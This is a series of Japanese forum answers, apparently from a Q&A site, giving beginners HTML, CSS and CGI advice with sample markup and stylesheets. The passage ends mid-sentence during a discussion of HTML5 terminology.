ポートレートと勘違いしていました。すみません。 「ポートレット」はサーバー側で処理し、 パーツ（ポートレット）を組み立てて１つのHTMLドキュメント全体を生成する、その一過程となると思いますから、 １つのHTMLファイルに埋め込む方がいいと思います。 そうしないと、フレームの数だけリクエストが増え、サーバーの負荷も増えると思います。 リクエスト開始 ↓ <head>タグ出力 <body>タグ、およびヘッダ出力 <div>ポートレット</div> ← ポートレット取得 <div>ポートレット</div> ← ポートレット取得 <div>ポートレット</div> ← ポートレット取得 ↓ クライアントへ -----フレームにした場合 リクエスト開始 ↓ <head>タグ出力 <body>タグ、およびヘッダ出力 <iframe 1>タグ出力 <iframe 2>タグ出力 <iframe 3>タグ出力 ↓ クライアントへ ・<iframe 1>より リクエスト開始 ↓ <head>出力 <body>、およびヘッダ出力 <div>ポートレット</div> ← ポートレット取得 ↓ クライアントへ ・<iframe 2>より リクエスト開始 ↓ <head>出力 <body>、およびヘッダ出力 <div>ポートレット</div> ← ポートレット取得 ↓ クライアントへ ・<iframe 3>より リクエスト開始 ↓ <head>出力 <body>、およびヘッダ出力 <div>ポートレット</div> ← ポートレット取得 ↓ クライアントへ
No.1のソースを実際に、Firefox,Opera,googleChrome,safari,IE5.5-IE10で表示すると、同じになるはずですが・・・ 　No.1でも説明しましたが、親であるコンテナブロックのサイズを参照します。
ウェブ上のページで、その画像を右クリックして現れるコンテキストメニュー(その場で可能なメニュー)から、画像だけを表示(ブラウザによって異なる)を選択して、画像を表示されると理由がわかります。 ファイル名が違う。 日本語のファイル名を使用している。 ファイルのパスが違う--URL欄を確認 など・・
こんにちは。 まず他の方もおっしゃられていますが、alt属性は必須となっています。 視覚効果をあげただけの画像ならaltはalt=" "とします。 見出しのような画像であれば、その見出し例えば営業時間であればalt="営業時間"とします。 なぜ目の悪い人への配慮かというと読み上げブラウザというものがありまして、ようはHTMLを解析した上で読み上げてくれるんです。 その時、alt属性が使われるので知人はそのことを言ったのだと思います。 言いがかりではないですが言い方はあるかな？と思います。
　目標がネットショップでしたら、楽天やYahoo!ショッピングなどのシステムを利用するほうが早くて確実です。 　それは将来の目的で、とりあえずウェブサイトを構築したいのでしたら ・ウェブの仕組み--インターネットやHTTPの基本的な仕組み ・HTMLやスタイルシート ・CGI,javascript,PHPなどプログラム 　などを身につけていきましょう。 　ここでは、HTML、スタイルシートについて説明すると ★HTMLは、HTML4.01strictが資料も豊富で、近々勧告されるであろうHTML5の元になるものなのでお勧め。XHTMLはあえてお勧めしません。 　→HTMLとXHTMLの違いについて - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7112581.html ) 　そのときに 1) 必ずHTML4.01strictに徹すること 　「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 2) class名やidは、文書構造を補完するものを使う。 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　実際になにを使うかは「HTML5の新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」とその意味が参考になるでしょう。 　端的に言うとHTMLを作るときデザインを考えるな!!! テキストエディタ--テキストエディタ EmEditor - EmEditor Free ( http://jp.emeditor.com/modules/download2/rewrite … )を手に入れて ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) を一通り通して実行してみること 　完成したら、 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) 　でチェックして直していくこと。 　また、HTML4.01の仕様書( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … )を一通り目を通しておき、必要なとき必要な項目を調べられるようになっておくこと。 　この方法が、もっとも早道で袋小路や遠回りをしなくて済む。 　HTMLがかけるようになったら、それをスタイルシートでデザインしていくことに挑戦しましょう。 下記も読んでおいてください。 HTMLについて、教えて下さい - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/6879715.html#a2 ) CSSの勉強におすすめの本【初心者です】 - Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/qa/6808604.html ) 　プログラムはその後で良いです。
すくなくとも href="./hello/test.html" href="hello/test.html" 　はシステムとは関係ありません。 　ユーザーエージェントが、この文字列を読み取って解釈した時点でいずれも、そのファイルが http：hoge.com/abc/index.html 　として取得したものでしたら、ブラウザはサーバーhoge.comに対して、HTTPプロトコルで /abc/hello/test.html 　を要求します。 　ブラウザが混乱しない限り、まったく問題ありません。というか、ブラウザは混乱しないでしょう。 ただし、 /abc/hello/index.html /abc/hello/ /abc/hello についは、同じtest.htmlが表示されるように設定してあっも、サーバーへの負荷は異なります。
1.該当ページのソースを開き自分のハードディスクに保存する。 　（仮にデスクトップ） 2.該当のページのソースを読み、ｃｓｓファイルのある場所をurlにいれ、ダウンロードする。 <link rel="stylesheet" type="text/css" href="../../file/css/list_all.css" /> ../の意味わかりますか？初歩ですので、わからなければ調べてください。 　（これもディスクトップに） 3.1.の2.で挙げたソースを <link rel="stylesheet" type="text/css" href="list_all.css" /> に変更し、保存。 4.2.を開き、他のｃｓｓファイルをダウンロード。 （これもディスクトップに） これで見本のページがそっくりそのまま手に入ります。これをテンプレにし、ご自分の好きな言葉やリンク先に変えてください。理解していない人が「長い分厚いだけの説明書」は不要とのことですので、説明はしません。説明しようとすれば、避けられませんので……。
まったく違います。 inline要素に、空要素はinline要素ですが、空要素にはそれ以外にたくさんのものが含まれています。 　定義上、まったく異なる意味の用語ですから混同しないように ★7.5.3 ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLの要素型には、内容が存在しないものもある。 例えばline breakの要素 BRには内容がない。 その唯一の役割は、テキストに含まれる1つの行の終端を示すことである。 このような 空要素は、終了タグを絶対に持たない。 文書型定義にも仕様本文にも、どの要素型が空であるか(内容がないか)や、内容を持てる場合の正当な内容は何かといったことが、示されている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［On SGML and HTML (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より
後の質問が締め切られているようなので、こちらにサンプル書いておきます。 とにかく最初の第一歩は、良い見本を元に、見よう見まねで書いてみることです。 そのとき、そのサンプルが良いかそうでないかは ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) でチェックしておくこと。 　下記サンプルは、上記で検証済みです。HTML4.01strictですから、将来のHTML5にもそのまま変更できます。tableを含め、非推奨な書き方は一切していません。 　HTML自体は、読むだけで何が書かれているか、どのようにマークアップすれば良いかがわかるでしょう。 　スタイルシート部分は難しいと思いますが、説明を書いておきましたので、それを読んでわからないところは調べてください。 　それで、あなたの期待されるデザインは、ほぼ出来上がりますから細かい部分は、ネットで調べて修正してください。 　 ★なお、タブは＿に置換してあるので、必ず戻してください。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;}/* おまじないを書いておきます */ body{background-color:gray;}/* わかりやすくするため背景に色を付けておきます。 */ h1,h2,h3,h4{margin:0;line-height:1.4em;}/* 見出しのmarginがはみ出すのを防ぐ */ /* これは、下のborderを消してみると効果がわかる */ div{border:solid 1px red;margin:0;}/* わかりやすくするためすべてのdivに枠線を引きます。 */ /* 同様にわかりやすくするため、それぞれのブロックに背景色を付けておきます。 */ div.header{background-color:aqua;min-height:100px;} div.section{background-color:silver;min-height:400px;} div.section div.section{background-color:white;min-height:0;} div.section div.tableContent{background-color:green;} div.footer{background-color:lime;min-height:100px;} /* ここまで、わかりやすくするため色・枠づけ・高さ--これをしておくとわかりやすいです。 */ /* ただし、borderのサイズだけそのブロックの外周サイズが大きくなっています */ /* 全体のサイズを決めます */ div.header,div.section,div.footer{ width:80%;min-width:640px;max-width:900px; margin:0 auto;/* ウィンドウの中央に */ } body>div.section{position:relative;}/* このdivの子孫要素の位置基準とするため */ div.section div.section{ min-width:0; /* 上での指定を消しておく */ width:auto; margin:0 20%;/* 左右に余白を開ける */ } div.section div.news, div.section div.tableContent{ position:absolute; /* 絶対配置を指定します。 */ height:100%; /* 高さは親要素の高さを参照します。(親がrelativeなので */ width:19%; top:0;/* 親要素の一番上 */ } div.section div.news{ right:0;/* 親要素の右 */ } div.section div.tableContent{ left:0;/* 親要素の左 上と入れ替えれば逆になる */ } /* ここからナビゲーションの横並び */ div.nav{width:100%;height:40px;line-height:40px;} div.nav ol,div.nav ol li{display:block;liest-style:none;margin:0;padding:0;text-align:center;} div.nav ol li{display:inline-block;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>見出し</h1> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="./">Top</a></li> ＿＿＿＿<li><a href="./book">Books</a></li> ＿＿＿＿<li><a href="./profile">Profile</a></li> ＿＿＿＿<li><a href="./contact">Contact</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<div class="news"><!-- float時代の左--> ＿＿＿<h2>新着情報</h2> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="section"><!-- float時代の中央 --> ＿＿＿<h2>本文見出し</h2> ＿＿＿<p>記事</p> ＿＿＿<h2>本文見出し</h2> ＿＿＿<p>記事</p> ＿＿＿<h2>本文見出し</h2> ＿＿＿<p>記事</p> ＿＿＿<h2>本文見出し</h2> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="tableContent"><!-- float時代の右 --> ＿＿＿<h3>新着情報</h3> ＿＿＿<ol> ＿＿＿＿<li><a href="#top">ページトップへ</a></li> ＿＿＿＿<li><a href="#section1">１章</a></li> ＿＿＿＿<li><a href="#section2">２章</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿</div> </body> </html>
http://www.tagindex.com/html_tag/link/index.html ダウンロードさせるだけなら　PDFをアップしてリンクを用意すればできます たとえば　名前やメールなどを入力させて 添付ファイルとしてPDFをメール送信するというものは 全自動ならCGIやPHPのようなサーバのプログラムが必要です 自分で送信するならメールフォームが利用できます http://www.formzu.com/ http://goo.gl/Cafr7 メールフォームは無料からあります 項目を設定して　入力されたものを受信できます アンケートに回答した人に手作業でPDFを送信するなら メールフォームを利用すればできます PDFの送信も自動化するならプログラムが必要です （メール送信可能なサーバも必要です）
デザイン感覚はすばらしいですね。 リキッドデザインにするときは、基本は巾に関しては、親コンテナブロックに対する%で指定するほうが無難です。 HTMLが <div class="header"> 　内容はページのヘッダ(この文書の内容の要約) </div> <div class="section"> 　<div class="main">本文(一分でわかる・・以下) 　</div> 　<div class="form"> 　　申請部分 　</div> </div> <div class="footer2> 　文書情報 　「MILKNEXTは全国の牛乳販売店さんに先進のITを活用したシステムを提供します。」 　<div class="nav"> 　　問合せや、ナビゲーション 　</div> </div> とマークアップされているとして div.header,div.section,div.footer{ width:80%;min-width:640px;margin:0 auto;max-width:800px; } div.header{margin-top:100px;} div.footer div.nav{position:absolute;top:0;height:100px;} /* ここから */ div.section{ position:relative; div.section div.main{ margin-right:30%; } div.section div.form{ width:29%; position:absolute; right:0; top:0; height:100%; } /* ここまで */ これで、最小640pxから最大800pxまで記事は中央配置され、formも常に右に表示されるはずです。 ポイントは、親コンテナブロックをrelativeにして、それを基準に中身をabsolute配置すると常に、親コンテナブロックのサイズと位置に合わせて配置できます。
一長一短があるので一概には言えません。 ・<base>エレメントを使用する方法 ・相対パスを使う方法 ・絶対パスを使う方法 　a)インターネットから(例)http://hoge.com/・・・ 　b)サーバーのトップから (例) /index.html ・<base>エレメントを使用する方法 　指定したURLから、パスを算出するのでサイト内のどこに移動しても使える。 　 ・相対パスを使う方法 　位置の相対関係が変わらないときに良く使われる。一般的にはこれが多い。 　作成中のページの位置が変わると利かなくなる。事前の設計をしっかりしておくこと ・絶対パスを使う方法 　a)インターネットから(例)http://hoge.com/・・・ 　作成中でもサイト上のファイルへリンクできる。逆にローカルファイルへリンクできない 　 　b)サーバーのトップから (例) /index.html 　<base>と同じような形質を持つが、ローカルにサーバーを構築していないと使えない。 　プロ向け(^^) 　基本的には、相対パスで指定するのが無難でしょう。ただし、事前にウェブサイト全体のディレクトリ構成をきちんと決めておくことが必要です。 / |-- index.html |-- sitemap.html |-- policy.html |-- images/ サイト内で共通に使用する画像 |-- css/ サイト内で共通して使うスタイルシート |-- js/ サイト内で使用するjavascript |-- product/ 製品 |　　|-- index.html |　　|-- images/ 製品ディレクトリ以下で使用する画像 |　　|-- product1/ ・・・【略】・・・ 　これをしておかないと、後でページ数が増えて整理するときに大変なことになります。他の指定方法でも言えることですが、特に相対パスを使うときは注意が必要です。
　ホームページだけなら問題にもならないでしょうが、ウェブサイトのすべてのウェブページとなると大変です。 　(ホームページとは、本来ブラウザを起動したときに表示するホーム(出発点)のこと、派出してウェブサイトのトップページのこと。サイト全体をホームページと言うと意味が通じないです。→ホームページ - Wikipedia ( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC% … )) 　objectに限らずimg,applet,iframeなど、描画で必要になった都度サーバーに要求するものは、HTTP通信のための時間が必要です。 　ただ、それらの通信が成立しなかったときのために、きちんとサイズや代替文字を入れて起きましょう。 　外部HTMLを埋め込む方法にはiframeとobjectがあります。 iframe: 非推奨のframesetを使わざるを得ない。HTML4.01strict,XHTML1.1では使えない。 object: strictやXHTML1.1で使える。ただし、targetなどは原則使えない。 　最も良いのは、objectもiframeも使わず、すべてのHTMLに書くことです。・・これが最も良いです。 　たくさんページがあるときは非効率なので、大規模なサイトでは、サーバーサイドでインクルードないし、PHPやCGI、SSPを使います。小規模なサイトなら、高機能テキストエディタを使って、すべてのファイルを置換してしまう。 　ファイルを開かなくても、指定したディレクトリのHTMLの特定の部分を一挙に置換できるテキストエディタがたくさんあります。
画像であっても、変わりません。 必ず代替テキストがあるはずです。 『テキストを画像に置き換えて表現する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 と名指しで否定されているし、 『alt属性は、IMG要素とAREA要素では必ず指定しなければならない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 ですから・・ 　もし画像がまったく読み込まれなくても、テキストが同じように表示されるはずですから。 　altは、いくら長くても構いませんし、各セクションには見出しなどが例に挙げたように書かれていても構いません。 <body> ＿<div class="article"> ＿＿<div class="header"> ＿＿＿<h1><img src="" width="" height="" alt="このページの見出し"></h1> ＿＿＿<p>A</p> ＿＿</div> ＿＿<div class="section"> ＿＿＿<h2>本文</h2> ＿＿＿<p><img src="" width="" height="" alt="D"></p> ＿＿＿<div class="figure"> ＿＿＿＿<h3>挿絵</h3> ＿＿＿＿<p><img src="" height="" width="" alt="E"></p> ＿＿＿</div> ＿＿</div> ＿＿<div class="aside"> ＿＿＿<div class="nav"> ＿＿＿＿<h2><img src="" height="" width="" alt="サイトマップ"></h2> ＿＿＿＿<ul> ＿＿＿＿＿<li><a href=""></a></li> ＿＿＿＿＿<li><a href=""></a></li> ＿＿＿＿</ul> ＿＿＿</div> ＿＿＿<div class="memo"> ＿＿＿＿<h2>メモ</h2> ＿＿＿＿<p><img src="" height="" width="" alt="C"></p> ＿＿＿</div> ＿＿</div> ＿＿<div class="footer"> ＿＿＿<h2>文書情報</h2> ＿＿＿<p class="logo"><img src="" height="" width="" alt="ロゴ(F)"></p> ＿＿＿<div class="profile"> ＿＿＿＿<h3>会社情報</h3> ＿＿＿＿<p><img src="" height="" width="" alt="G"></p> ＿＿＿</div> ＿＿＿<div class="documentInfo"> ＿＿＿＿<h3>更新履歴</h3> ＿＿＿＿<p><img src="" height="" width="" alt="H"></p> ＿＿＿</div> ＿＿</div> ＿</div> </body>
何をしたいのかよくわかりませんけれど… （長さは概ね72dpiで換算） <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> <html lang="ja"> <head><title>sample</title> <meta http-equiv="Content-Style-Type" content="text/css"> <meta http-equiv="Content-Script-Type" content="text/javascript"> <style type="text/css"> <!-- #hoge div { margin:0; padding:0; font-size:0; height:14px;　border-bottom:1px solid #666; } //--> </style> </head> <body> <div id="hoge" style="width:142px;"> </div> <script type="text/javascript"> <!-- setInterval(function(){ var d = document.createElement("div"); d.appendChild(document.createTextNode("\u0020")); document.getElementById("hoge").appendChild(d); }, 500); //--> </script> </body> </html>
javascriptでスタイルシートを書き換えている。 firefox+fireBugで、該当する目次を開いた状態で見つけ、その要素のidをスクリプト内で検索すると簡単に見つかります。 　javascriptを使わなくても、各sectionにcontentTableを書くと可能ですね。 　そのページでは、javascriptを使ってページの末尾のtableContentをウィンドウの中央付近に移動させています。
ちゃんと固定されてますよ。 スクローロバーが出るようにすると分かりやすいです。 <p>aaaaaaaaaa</p> <p style="margin-top:100em;">bbbbbbbbbb</p> というか、どううまく行かないのかもっと具体的に書かないと誰も分からないでしょう ^^;
いくつか基本的なことを 1) HTMLの要素にはブロック要素とインライン要素があります。 　ブロック要素は、その前後にスペースをとって改行される。インライン要素は前後で改行されません。 　→7.5.3 ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 2) CSSでは、それぞれについて、とりうるプロパティやサイズの解釈がことなります。 　インライン要素はwidthやheightプロパティは非置換インライン要素、tableのrow,rowgroupには使えません。使える場合も意味が異なります。 　→8.1 ボックスの寸法（Box dimensions） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　→9.4.2 インラインの整形コンテキスト（Inline formatting context） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　たとえば、<p>文章<span>長い文章</span>文章</p>というHTMLに対して、 p{width:500px;boredr:solid 1px red;} span{width:200px;border:solid green 1px;} とすると、理解できるでしょう。 　<a>要素は、非置換インライン要素ですから、高さの指定をしても意味がありません。IE6はバグがあり機能します。 　たとえば、HTMLが次のような場合 <body> 　<div class="nav"><!-- ナビゲーションだと示すブロック --> 　　<ul><!-- リストだよ --> 　　　<li><a href="">なんたらかんたら</a></li><!-- リストの項目 --> 　　　<li><a href="">なんたらかんたら</a></li> 　　　<li><a href="">なんたらかんたら</a></li> 　　　<li><a href="">なんたらかんたら</a></li> 　　</ul> 　</div> </body> の場合、スタイルシートは /* リスト及びその項目をblockにする */ div.nav ul,div.nav ul li{display:block;list-style:none;margin:0;padding:0;} div.nav ul li{ /* 項目のサイズを決める */ width:100px;height:20px; /* 一行の高さを決める */ line-height:20px; text-align:center; border:outset gray 2px; /* float:left *//* 横に並べるなら */ } div.nav ul li+li{/* 兄弟 */ margin-top:5px; /* margin-left: 5px;*/ /* 横に並べるなら */ } div.nav ul li a{ /* a要素をブロックに変える */ display:block; /* サイズをいっぱいに */ width:100%;height:100%; /* 背景を指定する */ background:gray url() no-repeat top left; } div.nav ul li a:active{ background-position:bottom; border-style:inset; } 継承されるプロパティは、親に書く。 継承されるプロパティは一度しか書くな。 　・・・メンテナンスが大変になる。継承されるか否かは、ほぼ常識の範囲内ですが、わからないときは、仕様書を見ましょう。 Property index ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　→調べるプロパティ 　　Inherited?　継承の有無 　　Initial value　初期値 　　など
　これは、あくまでサンプルであるためHTML内に書いていますが、基本はスタイルシートは外部に置くものです。特にXHTMLは外部に置くのが基本です。置くべきです。 　その場合は、 <link rel="stylesheet" type="text/css" media="screen" href="./styleSheet/standard.css"> 　のように指定します。 外部スタイルシートには、 外部スタイルシート ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　など・・・
＞ご教示いただきました方法を試させていただきます。 　でしたら、もう少し具体的に /root |- indexen.htm en |- indexjp.htm　jp |- index.html |-- /jp |-- /en .htaccess AddType application/x-httpd-cgi index.html; 下位ホルダーの最上階8/en,/jp)には AddType text/html index.html; index.html #!usr/locla/bin/perl ・・・ if($request="jp"){ 　open(IN)・・・indexjp.htm 　while(<IN>){print;} } else{ 　if($ENV{'HTTP_ACCEPT_LANGUAGE'}=~/ja.+/){ 　　open(IN)・・・indexjp.htm 　　while(<IN>){print;} 　} 　else{ 　　open(IN)・・・indexen.htm 　　while(<IN>){print;} } 程度・・ 　呼び出されたときに、サーバーの環境変数(HTTP_ACCEPT_LANGUAGE)に、ブラウザの言語が入りますから、それをつかって利用するページが変わる。 　作成時は、CGIのファイル名を変えて置いて、indexen.htmをindex.htmlなどにして作成する。フォームで、ユーザーエージェントに関わらず、他の言語を選べるようにするとユーザーにも優しいかと・・
<!DOCTYPE html> <html> <head> <script type="text/javascript"> function func() { document.getElementById("div1").innerHTML = document.getElementById("text1").value; } </script> </head> <body> <input type="text" id="text1"> <input type="button" onclick="func()"> <div id="div1"></div> </body> </html>
通常は、JavaScriptかPHPなどのCGIで処理しますが、初心者さんであることを考慮すると、iframeがもっとも現実的だと思います。スクリプトではなくhtmlなので理解は速いと思います。「iframe」で検索すればたくさん出てきますよ。
フレームは、今はほとんど使われない技術です。 ★html フレーム 問題 - Google 検索 ( http://www.google.co.jp/#sclient=psy-ab&hl=ja&sa … ) ＞【hogehoge】というリンクをクリックしたら、 のリンクがどこにあるのかがわかりません。 　単純にindexページのリンクでしたら、framesetのページを開けばよいです。 ＞フレーム(1)に小説のタイトルを表示し、フレーム(2)に本文を表示したいのです。 　これでしたら、通常はフレームを使わないほうが良いでしょう。HTMLをきちんと「文書構造」にしたがってマークアップして、そのページの目次はheader内に、全体のナビゲーションをfooterに書いて、スタイルシートで期待される表示になるようにデザインしましょう。
他の方も回答されていますが、SEOを誤解されています。 SEOは「アクセスを増やす方法」ではありません。 ちなみに、サブドメイン(同IP)での運用は、検索エンジンから見て、別ディレクトリでの運用と差はありませんよ。
IMG要素は置換インライン要素ですから、サイズは画像サイズに依存します。 ブロック要素にしてから、コンテナブロックの大きさを参照すれば良いです。 先日回答した ★1カラムのリキッドレイアウトについて。 - Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7292209.html#a3 ) を参考に・・ セレクタ IMG{display:block;width:100%;height:auto;} が基本です。 　スマートフォン、およびモダンブラウザのみ対応でよければ、background-size:プロパティでも良いでしょう。 　私は、スマートフォン用のみのページを作ることはないので、PC用/スマートフォン用、携帯用、印刷用など用にスタイルシートを切り替えられるようにすることが多いですね。
ローカルサーバーを作ってください。 CGIにしろ、PHPにしろいずれ必要になります。 ちなみに、私は専用のパーテーション(G:)を用意して、そのルートにCIGWINを入れた上で G:---cygwin |-- usr |　　|-local |　　　　|- apache |　　　　|-bin |　　　　　　|- perl |　　　　　　|- php |-- user 　　　|-- hoge1 　　　　　　|-- html など、できるだけUNIXに合わせて入れてます。CGIだけでなく、シェルスクリプトやPHPの確認、HTML内のパスが絶対パスで書けるなどたくさんのメリットがあります。 　道のりは大変でしょうが、ぜひ挑戦してみてください。 ★ Cygwin ( http://ja.wikipedia.org/wiki/Cygwin ) ★ Cygwinのインストール＆設定方法( http://musashi.sourceforge.jp/cygwin/cygwin.html ) ★日本Apacheユーザ会 新着情報 — Apache JP ( http://www.apache.jp/ ) など・・
暇が取れたので、簡単なものを ★ただし、IEは対応していない。firefox,Opera,safari,google ChromeなどではOK 　IE用にtransform,rotationを使う方法は自分で調べてください。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.nav{width:80%;margin:0 auto; -moz-transform: rotate(-10deg); -webkit-transform: rotate(-10deg); -o-transform: rotate(-10deg); -ms-transform: rotate(-10deg); } div.nav ul,div.nav ul li,div.nav ul li a,div.nav ul li a img{disoaly:block;list-style:none;margin:0;padding:0;} div.nav ul li{width:33%;float:left;postition:relative;} div.nav ul li a img{width:100%;height:auto;position:relative;opacity:0.5;} div.nav ul li a:hover img{width:120%;top:-10%;left:-10%;z-index:100;opacity:1.0; -moz-transform: rotate(10deg); -webkit-transform: rotate(10deg); -o-transform: rotate(10deg); -ms-transform: rotate(10deg); } --> ＿</style> </head> <body> ＿<h1>サンプル</h1> ＿<div class="nav"> ＿＿<ul> ＿＿＿<li><a href=""><img src="./images/1.jpg" width="640" height="480" alt="メニュー1"></a></li> ＿＿＿<li><a href=""><img src="./images/2.jpg" width="640" height="480" alt="メニュー1"></a></li> ＿＿＿<li><a href=""><img src="./images/3.jpg" width="640" height="480" alt="メニュー1"></a></li> ＿＿</ul> ＿</div> </body> </html>
　何らかの意思があってそのようなファイル名にしているのでしょうが、その意味はわかりません。 　Windowsは、拡張子を見て動作を決定する、とってもへんてこなＯＳですが、他のＯＳにとって、拡張子はファイルの種類を示すものでも、動作するアプリケーションを指定するものでもありません。たとえば、ディレクトリごとにファイルを名称や拡張子などで個別に指定したりすることが出来るものが多いです。 　ですから、単にファイル名の一部分と言う意味以上に、意味はまったくないでしょう。
＞<tr>に<form>を入れないといけない理由があり、 　いえ、それは・・・・。 [HTML] ・formごとにtableを書く ・tableを使わず、スタイルシートでデザインする。 [CGI] ・送信先が同じCGIなら、nameの値をすべて変え、処理する。
CSSでの指定もされてますか？ article,aside,canvas,details,figcaption,figure,footer,header,hgroup,menu,nav,section,summary { display:block; } それでもなら、 IE Print Protector( https://github.com/afarkas/html5shiv )含んでいる http://remysharp.com/downloads/html5.js を指定する。 ※html5shiv ie print protector 印刷 - Google 検索 ( http://www.google.co.jp/search?q=html5shiv&ie=ut … ) 　IEを使わなきゃ済む話ですが・・・
上位表示と言ってもキーワードによります。 サイト名などでトップページがヒットしないのであれば、根本的に知識不足の可能性があるので勉強してください。 それ以外の特定のキーワードであれば、普段から良く閲覧されるページが上に上がりやすくなります。 この場合はトップページに呼び込むためのトップページコンテンツの見直しなどが必要です。
そういえばlocationはhashをもってましたね <input type="submit" value="go" onclick="parent.location.hash='wrap'"> みたいな感じで？
追記。Terapadというフリーウェアのテキストエディタを使うと、現在の文字コードの確認も、文字コードの変更もhttp://i-njoy.net/blognplus/index.php?e=115のような手順で可能です。Windowsのメモ帳をお使いだと、こうした文字コード絡みのトラブルに対応できないので、こちらを使うことをおすすめしておきます。 http://www5f.biglobe.ne.jp/~t-susumu/library/tpa …
簡単に出来るはずですが・・ <iframe id="aswift_0" ・・・> を、その親要素である <ins id="aswift_0_anchor"・・・> の巾を100%にして、からtext-align:centerにすればよい。 便利なツール 　firefox+firebug 　で該当する要素を見つけて、スタイルシートを色々変えてみればよい。
＞画像の文字色を変えることなどできませんでしたね。 　はい、しかし・・ <a href="./index.html"><img src="./images/Logo.gif" width="80" height="80" alt="Topへ"></a> 　このままでも、驚かれますが・・文字を表示させれば出来ます。 a[href="./index.html"]{ position:relative;line-height:80px; /* 画像の高さに合わせる */ text-align:center;display:inline-block; } a[href="./index.html"]:after{ content:"TOPへ";color:blue;position:absolute;top:0;left:0; font-weight:bold;font-size:20px;/*テキストの大きさ太さ */ width:80px;/* 画像の巾に合わせる */ } a[href="./index.html"]:hover:after{color:red;} 　面白いでしょ(^^) 　
"obsolete" と言えば、通常は「廃止」の意味です。 e.g. http://www.w3.org/TR/html401/conform.html#didx-o … | "obsolete" な要素・属性とは、利用者エージェントがサポートする保証のないものである。"obsolete" な要素は、もはや当規定では定義されないが、歴史的目的のために当参考マニュアルの「変更点」に一覧を載せておく。 しかし、HTML(5) の "obsolete" は、少しだけ意味が変わっています。用語として定義されていないので、実際にどう使われているかを確認して下さい。 --- ところで、2 つの用語、適合（conformance）要件（requirements）を覚えて下さい。これらの意味は HTML: 2.2.1 にズラズラと書かれています。 ・適合文書 ・適合ウェブブラウザ（インタラクティブ UA）、非インタラクティブ UA、視覚系 UA、非スクリプティング UA、適合性チェッカ、データ発掘ツール、制作ツール・マークアップ生成器 ページ制作者は「適合する文書」を、UA 開発者は「適合する UA」を目指さねばなりません。立場によって要求されるもの（要件）が違うのです。 ウェブブラウザがうまく解釈してくれるものであっても、ページ制作者がやって良いことであるとは限りません。そのことは HTML: 1.11 および WHATWG FAQ: 4.16 にクドクド注意されています。 思い返せば、Authoring 要件と User Agent 要件の分離というのは、これまでも HTML 4.0(1) Strict と Transitional の分離として暗黙に行われてきたことです。さらに言えば、インターネットの設計原則を述べた RFC 1958 にも「送るときは厳密に、受け取るときは寛容に」と書かれています。 HTML(5) は、普通に文書を作ればそれなりに後方互換性を保てるよう配慮されています。もし、それ以上に古いものが必要ならば UA にのみそれを許可し、ページ制作者には許可しない、というやり方になりました。それは、古い文書の解釈をブラウザ間で（それなりに）統一し、かつ、ページ制作者に古いページを作らせないためです。 -- 閑話休題。HTML: 15 をざっと追ってみます。 15.1 節は「廃止されたが適合する諸特徴」です。これらは適合違反ではないものの、これからのページ制作者が使うべきではなく（should not）、適合性チェッカが警告を出さねばならないものです。HTML 4.01/XHTML 1.0 Strict、XHTML 1.1 の文書型宣言もこれに含まれます。 15.2 節は「非適合な諸特徴」です。ページ制作者がこれらを用いてはなりません（must 